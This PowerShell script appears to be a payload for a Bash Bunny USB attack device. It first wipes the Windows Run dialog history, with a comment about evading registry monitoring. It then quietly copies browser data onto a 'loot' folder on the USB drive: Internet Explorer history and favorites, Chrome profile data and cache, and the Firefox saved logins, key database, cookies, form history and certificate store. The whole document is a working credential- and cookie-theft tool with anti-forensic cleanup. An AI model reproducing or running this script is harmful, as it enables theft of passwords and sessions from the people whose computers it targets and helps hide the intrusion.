# Remove run history
# COMMENT THIS LINE OUT IF RUNNING ON A SYSTEM THAT MIGHT MONITOR REGISTRY EDITS
powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"

# Get the path and file name that you are using for output
# find connected bashbunny drive:
$VolumeName = "BashBunny"
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
    if ($_.VolumeName -eq $VolumeName) {
        $backupDrive = $_.DeviceID
    }
}

# See if a loot folder exist in usb. If not create one
$TARGETDIR = $backupDrive + "\loot\"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

# See if the BrowserData folder exists in loot folder. If not create one
$TARGETDIR = $backupDrive + "\loot\BrowserData\"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

# See if the ComputerName folder exists in BrowserData folder. If not create it
$TARGETDIR = $backupDrive + "\loot\BrowserData\" + $computerSystem.Name
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

# Create a path that will be used to make the file
$datetime = get-date -f yyyy-MM-dd_HH-mm
$backupPath = $TARGETDIR + "\" + $computerSystem.Name + " - " + $datetime + ".txt"

# Create output from info script
$TARGETDIR = $MyInvocation.MyCommand.Path
$TARGETDIR = $TARGETDIR -replace ".......$"
cd $TARGETDIR
$TARGETDIR = $backupDrive + "\loot\BrowserData\" + $computerSystem.Name

# Create folders necessary for Browser Info Dump
New-Item -ItemType directory -Path $TARGETDIR\IE
New-Item -ItemType directory -Path $TARGETDIR\IE\Favorites
New-Item -ItemType directory -Path $TARGETDIR\chrome
New-Item -ItemType directory -Path $TARGETDIR\chrome\cache
New-Item -ItemType directory -Path $TARGETDIR\firefox

# xcopy arguments:
# /C Continues copying even if errors occur.
# /Q Does not display file names while copying.
# /G Allows the copying of encrypted files to destination that does not support encryption.
# /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
# /E Copies directories and subdirectories, including empty ones.

# Internet Explorer Browser History
xcopy /C /Q /G /Y /E $env:userprofile\Favorites\* $TARGETDIR\IE\Favorites
if (Test-Path $env:userprofile\AppData\Local\Microsoft\Windows\History) {
	xcopy /C /Q /G /Y /E $env:userprofile\AppData\Local\Microsoft\Windows\History\* $TARGETDIR\IE
}

# Chrome Profile Data
if (Test-Path "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default") {
	xcopy /C /Q /G /Y "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default\*" $TARGETDIR\chrome
	xcopy /C /Q /G /Y /E "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default\databases\*" $TARGETDIR\chrome
	xcopy /C /Q /G /Y /E "$env:userprofile\AppData\Local\Google\Chrome\User Data\Default\Cache\*" $TARGETDIR\chrome\cache
}

# Firefox Profile Data
if (Test-Path $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles) {
	$ProfileDir = Get-ChildItem $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\ | Where-Object{$_.PSIsContainer} | ForEach-Object{$_.Name}
	xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\places.sqlite $TARGETDIR\firefox
	xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\key4.db $TARGETDIR\firefox
	xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\logins.json $TARGETDIR\firefox
	xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\cookies.sqlite $TARGETDIR\firefox
	xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\formhistory.sqlite $TARGETDIR\firefox
	xcopy /C /Q /G /Y $env:userprofile\AppData\Roaming\Mozilla\Firefox\Profiles\$ProfileDir\cert9.db $TARGETDIR\firefox
}